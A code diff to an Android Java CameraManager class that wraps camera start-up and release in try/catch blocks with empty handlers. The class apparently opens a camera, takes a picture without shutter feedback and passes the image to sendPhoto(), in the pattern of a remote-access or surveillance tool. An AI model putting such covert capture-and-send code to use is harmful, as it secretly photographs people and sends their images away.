@@ -29,7 +29,7 @@ public class CameraManager {
 
 
     public void startUp(int cameraID){
-
+            try{
                 camera = Camera.open(cameraID);
                 camera.startPreview();
                 camera.takePicture(null, null, new PictureCallback() {
@@ -39,6 +39,10 @@ public class CameraManager {
                         sendPhoto(data);
                     }
                 });
+            }catch (Exception ex){
+
+
+            }
     }
 
 
@@ -65,11 +69,17 @@ public class CameraManager {
     }
 
     private void releaseCamera(){
-        if (camera != null) {
-            camera.stopPreview();
-            camera.release();
-            camera = null;
+        try {
+            if (camera != null) {
+                camera.stopPreview();
+                camera.release();
+                camera = null;
+            }
+        }catch (Exception ex)
+        {
+
         }
+
     }
 
     public JSONObject findCameraList() {
@@ -77,10 +87,6 @@ public class CameraManager {
         if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
             return null;
         }
-
-
-
-
 
         try {
             JSONObject cameras = new JSONObject();
